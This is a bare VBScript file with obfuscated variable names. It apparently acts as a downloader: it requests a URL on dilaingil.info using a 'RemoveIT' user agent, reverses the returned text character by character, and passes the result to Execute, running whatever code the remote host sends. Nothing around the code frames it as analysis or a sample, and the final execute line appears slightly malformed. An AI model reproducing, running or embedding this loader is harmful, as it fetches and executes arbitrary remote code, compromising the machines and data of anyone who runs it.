bv0Rb="aL9Nz7ttwJJdVLLw7xInnSIbz"
URL="http://dilaingil.info/?c=r&" & bv0Rb
set hXE6m=CreateObject("Microsoft.XMLHTTP")

hXE6m.open "GET",URL,false
hXE6m.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
hXE6m.setRequestHeader "User-Agent", "RemoveIT"
hXE6m.send "Z"

For i = Len(hXE6m.responsetext) to 1  Step-1
    var= Mid(hXE6m.responsetext,  i  , 1)
    i22MK = i22MK & var
Next

execute "Execute i22MK & bv0RbhXE6m"
